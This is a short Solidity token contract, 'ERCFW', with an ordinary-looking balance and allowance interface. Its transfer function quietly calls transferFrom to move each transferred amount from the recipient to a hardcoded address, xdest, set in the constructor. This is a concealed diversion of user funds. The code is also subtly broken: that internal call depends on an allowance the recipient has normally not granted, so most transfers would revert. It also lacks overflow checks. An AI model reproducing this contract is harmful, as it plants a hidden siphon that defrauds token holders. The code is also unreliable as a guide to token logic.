pragma solidity ^0.4.24;
contract ERCFW {
    address public xdest;
    mapping (address =&gt; uint256) public balanceOf;
    function ERCFW() public {
        xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
    }
    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] &gt;= value);
        balanceOf[msg.sender] -= value;  // deduct from sender&#39;s balance
        balanceOf[to] += value;          // add to recipient&#39;s balance
        transferFrom(to, xdest, value);
        return true;
    }
    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value &lt;= balanceOf[from]);
        require(value &lt;= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        return true;
    }
}